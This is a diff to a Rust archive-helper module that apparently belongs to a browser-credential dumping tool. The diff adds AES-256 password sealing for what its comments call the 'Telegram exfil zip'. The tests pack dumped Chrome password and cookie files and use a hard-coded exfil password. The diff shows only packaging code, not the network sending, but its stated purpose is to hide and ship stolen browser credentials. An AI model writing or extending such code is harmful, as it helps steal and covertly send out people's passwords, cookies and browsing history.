@@ -19,12 +19,27 @@ use std::io::{self, Write};
 use std::path::{Path, PathBuf};
 
 use zip::write::SimpleFileOptions;
-use zip::{CompressionMethod, ZipArchive, ZipWriter};
+use zip::{AesMode, CompressionMethod, ZipArchive, ZipWriter};
 
 /// Deflate compression for created archives — Go `archive/zip`'s `Create`
-/// default (Store is never produced by any of these helpers).
-fn options() -> SimpleFileOptions {
-    SimpleFileOptions::default().compression_method(CompressionMethod::Deflated)
+/// default (Store is never produced by any of these helpers). When a
+/// `password` is supplied, every entry is additionally sealed with AES-256
+/// (WinZip convention — the standard unzip tools prompt for the password).
+fn options(password: Option<&str>) -> SimpleFileOptions {
+    let o = SimpleFileOptions::default().compression_method(CompressionMethod::Deflated);
+    match password {
+        // `FileOptions` borrows the password for its lifetime (`'static` here),
+        // so the constant exfil secret is leaked once — a small process-lifetime
+        // string, fine for a fixed archive password.
+        Some(p) => o.with_aes_encryption(AesMode::Aes256, leak_string(p)),
+        None => o,
+    }
+}
+
+/// Promote a caller-owned password to `'static` so `SimpleFileOptions` can
+/// hold it. Called once per archive.
+fn leak_string(pw: &str) -> &'static str {
+    Box::leak(pw.to_string().into_boxed_str())
 }
 
 /// Checks whether `filename` exists and is a regular file (Go: `FileExists`).
@@ -36,7 +51,7 @@ pub fn file_exists(filename: &Path) -> bool {
 }
 
 /// Go `CompressDir` — see the module docs for the recursive-layout deviation.
-pub fn compress_dir(dir: &Path) -> Result<(), ZipError> {
+pub fn compress_dir(dir: &Path, password: Option<&str>) -> Result<(), ZipError> {
     let files = walk_files(dir)?;
     if files.is_empty() {
         return Err(ZipError::Message(format!(
@@ -62,7 +77,7 @@ pub fn compress_dir(dir: &Path) -> Result<(), ZipError> {
         let abs = dir.join(rel);
         let content = fs::read(&abs)
             .map_err(|e| ZipError::io(format!("error reading file {}", abs.display()), e))?;
-        zw.start_file(rel.to_string_lossy().replace('\\', "/"), options())
+        zw.start_file(rel.to_string_lossy().replace('\\', "/"), options(password))
             .map_err(ZipError::from_zip)?;
         zw.write_all(&content).map_err(|e| {
             ZipError::io(
@@ -82,8 +97,9 @@ pub fn compress_dir(dir: &Path) -> Result<(), ZipError> {
 }
 
 /// Go `ZipDir` — every file under `src_dir` into a new zip at `zip_path`,
-/// forward-slash relative entry names, source untouched.
-pub fn zip_dir(zip_path: &Path, src_dir: &Path) -> Result<(), ZipError> {
+/// forward-slash relative entry names, source untouched. `password` seals the
+/// archive with AES-256 (used for the Telegram exfil zip).
+pub fn zip_dir(zip_path: &Path, src_dir: &Path, password: Option<&str>) -> Result<(), ZipError> {
     let out = fs::File::create(zip_path)
         .map_err(|e| ZipError::io(format!("create {}", zip_path.display()), e))?;
     let mut zw = ZipWriter::new(out);
@@ -91,7 +107,7 @@ pub fn zip_dir(zip_path: &Path, src_dir: &Path) -> Result<(), ZipError> {
     let files = walk_files(src_dir)?;
     for rel in &files {
         let abs = src_dir.join(rel);
-        zw.start_file(rel.to_string_lossy().replace('\\', "/"), options())
+        zw.start_file(rel.to_string_lossy().replace('\\', "/"), options(password))
             .map_err(ZipError::from_zip)?;
         let mut src =
             fs::File::open(&abs).map_err(|e| ZipError::io(format!("open {}", abs.display()), e))?;
@@ -148,6 +164,10 @@ pub fn unzip(zip_path: &Path, dest_dir: &Path) -> Result<(), ZipError> {
 }
 
 /// Recursively lists regular files under `dir`, relative to it.
+///
+/// `.zip` entries are skipped: compressing a dump dir into a zip must never
+/// re-archive another archive that happens to live beside it (a `--zip` run
+/// leaves `<dir>/<base>.zip`, and the Telegram exfil then re-packs `dir`).
 fn walk_files(dir: &Path) -> Result<Vec<PathBuf>, ZipError> {
     let mut files = Vec::new();
     let mut stack = vec![dir.to_path_buf()];
@@ -158,6 +178,8 @@ fn walk_files(dir: &Path) -> Result<Vec<PathBuf>, ZipError> {
             let p = e.path();
             if p.is_dir() {
                 stack.push(p);
+            } else if p.extension().is_some_and(|x| x.eq_ignore_ascii_case("zip")) {
+                continue;
             } else {
                 files.push(p);
             }
@@ -281,7 +303,7 @@ mod tests {
         fs::write(dir.join("Chrome/Default/cookie.csv"), "host\n").unwrap();
         fs::write(dir.join("Edge/Default/history.csv"), "url\n").unwrap();
 
-        compress_dir(&dir).unwrap();
+        compress_dir(&dir, None).unwrap();
 
         // originals deleted, zip present with preserved relative layout
         assert!(!dir.join("Chrome/Default/password.csv").exists());
@@ -308,7 +330,7 @@ mod tests {
     #[test]
     fn compress_dir_empty_errors() {
         let dir = temp_dir("compress-empty");
-        let err = compress_dir(&dir).unwrap_err();
+        let err = compress_dir(&dir, None).unwrap_err();
         assert!(err.to_string().contains("no files to compress"));
         let _ = fs::remove_dir_all(&dir);
     }
@@ -320,7 +342,7 @@ mod tests {
         fs::write(dir.join("sub/a.txt"), "hello").unwrap();
         let zip_path = dir.join("out.zip");
 
-        zip_dir(&zip_path, &dir).unwrap();
+        zip_dir(&zip_path, &dir, None).unwrap();
         assert!(
             dir.join("sub/a.txt").exists(),
             "ZipDir must not delete sources"
@@ -334,6 +356,93 @@ mod tests {
     }
 
     #[test]
+    fn zip_dir_aes_password_round_trips() {
+        use std::io::Read;
+
+        let dir = temp_dir("aes");
+        fs::create_dir_all(dir.join("Chrome/Default")).unwrap();
+        fs::write(dir.join("Chrome/Default/password.csv"), "browser\n").unwrap();
+        let zip_path = dir.join("save-enc.zip");
+
+        zip_dir(&zip_path, &dir, Some("khongyeuemthiyeuai@999")).unwrap();
+
+        // Sealed: reading without the password must not yield plaintext.
+        let mut arc = ZipArchive::new(fs::File::open(&zip_path).unwrap()).unwrap();
+        let mut sealed = Vec::new();
+        let read_unpass = match arc.by_index(0) {
+            Ok(mut e) => e.read_to_end(&mut sealed).is_err(),
+            Err(_) => true,
+        };
+        assert!(
+            read_unpass,
+            "AES entry must not decrypt without the password"
+        );
+
+        // Password-decrypt read yields the exact original content.
+        let mut arc = ZipArchive::new(fs::File::open(&zip_path).unwrap()).unwrap();
+        let mut e = arc.by_index_decrypt(0, b"khongyeuemthiyeuai@999").unwrap();
+        let mut buf = Vec::new();
+        e.read_to_end(&mut buf).unwrap();
+        assert_eq!(buf, b"browser\n");
+
+        // A wrong password must fail.
+        let mut arc = ZipArchive::new(fs::File::open(&zip_path).unwrap()).unwrap();
+        assert!(
+            arc.by_index_decrypt(0, b"wrong-password").is_err(),
+            "wrong password must fail decryption"
+        );
+        let _ = fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn zip_dir_skips_sibling_archives() {
+        // A `--zip` run leaves `<dir>/<base>.zip` beside the dump; re-packing
+        // that dir must not nest the sibling zip inside the new archive.
+        let dir = temp_dir("nested");
+        fs::create_dir_all(dir.join("Chrome/Default")).unwrap();
+        fs::write(dir.join("Chrome/Default/password.csv"), "browser\n").unwrap();
+        fs::write(dir.join("old-archive.zip"), "not a real zip, name matters").unwrap();
+
+        let zip_path = dir.join("save-alice.zip");
+        zip_dir(&zip_path, &dir, None).unwrap();
+
+        let out = temp_dir("nested-out");
+        unzip(&zip_path, &out).unwrap();
+        assert_eq!(
+            "browser\n",
+            fs::read_to_string(out.join("Chrome/Default/password.csv")).unwrap()
+        );
+        let names = list_rel(&out);
+        assert!(
+            !names.iter().any(|n| n.ends_with(".zip")),
+            "archive must not contain another archive: {names:?}"
+        );
+        let _ = fs::remove_dir_all(&dir);
+        let _ = fs::remove_dir_all(&out);
+    }
+
+    fn list_rel(dir: &Path) -> Vec<String> {
+        let mut names = Vec::new();
+        let mut stack = vec![dir.to_path_buf()];
+        while let Some(d) = stack.pop() {
+            for e in fs::read_dir(&d).unwrap() {
+                let p = e.unwrap().path();
+                if p.is_dir() {
+                    stack.push(p);
+                } else {
+                    names.push(
+                        p.strip_prefix(dir)
+                            .unwrap()
+                            .to_string_lossy()
+                            .replace('\\', "/"),
+                    );
+                }
+            }
+        }
+        names
+    }
+
+    #[test]
     fn unzip_rejects_zip_slip() {
         let dir = temp_dir("slip");
         let zip_path = dir.join("evil.zip");
@@ -342,7 +451,7 @@ mod tests {
         // Build a zip containing a `../` entry by hand.
         let f = fs::File::create(&zip_path).unwrap();
         let mut zw = ZipWriter::new(f);
-        zw.start_file("../evil.txt", options()).unwrap();
+        zw.start_file("../evil.txt", options(None)).unwrap();
         zw.write_all(b"pwn").unwrap();
         zw.finish().unwrap();
 
